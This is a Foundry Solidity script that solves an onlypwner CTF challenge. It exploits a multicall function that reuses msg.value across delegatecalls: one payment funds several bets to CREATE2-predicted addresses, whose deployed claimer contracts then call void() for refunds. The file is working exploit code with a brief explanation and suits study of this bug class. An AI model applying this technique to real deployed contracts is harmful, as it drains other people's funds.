pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

interface IAllOrNothing {
    function bet(uint256 number, address recipient) external payable;

    function void() external;

    function BET_AMOUNT() external view returns (uint256);
}

interface IMulticall {
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results);
}

// https://onlypwner.xyz/challenges/10
// the multicall function performs many delegate calls using a for-loop, in this case the msg.value persists across each chain.
// bet function checks the msg.value, we can perform one bet and call void to get refund, add more bet in the multicall and call the bet again with the msg.value and it will pass so we can call the void() again
// as the late bet() checks the same msg.value it will pass because of the delegatecall loop, after the check is passed internal mapping is updated so we are eligible for the void function call.
contract VoidClaimer {
    IAllOrNothing public target;

    constructor(IAllOrNothing _target, address receiver) {
        target = _target;
        _target.void();
        selfdestruct(payable(receiver));
    }
}

contract Attacker {
    IAllOrNothing public immutable target;

    constructor(IAllOrNothing _target) {
        target = _target;
    }

    function attack() external payable {
        uint256 betAmount = target.BET_AMOUNT();

        bytes[] memory calls = new bytes[](6);
        bytes memory initCode = abi.encodePacked(type(VoidClaimer).creationCode, abi.encode(target, msg.sender));
        bytes32 initCodeHash = keccak256(initCode);

        for (uint256 i = 0; i < 6; i++) {
            bytes32 salt = bytes32(i);
            address recipient = _predictCreate2(salt, initCodeHash);
            calls[i] = abi.encodeCall(target.bet, (100 + i, recipient));
        }

        IMulticall(address(target)).multicall{value: betAmount}(calls);

        for (uint256 i = 0; i < 6; i++) {
            new VoidClaimer{salt: bytes32(i)}(target, msg.sender);
        }
    }

    function _predictCreate2(bytes32 salt, bytes32 initCodeHash) private view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, initCodeHash));
        return address(uint160(uint256(hash)));
    }
}

contract SolveAllOrNothing is Script {
    function run() public {
        vm.startBroadcast();

        IAllOrNothing allOrNothing = IAllOrNothing(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
        Attacker attacker = new Attacker(allOrNothing);
        attacker.attack{value: allOrNothing.BET_AMOUNT()}();

        vm.stopBroadcast();
    }
}
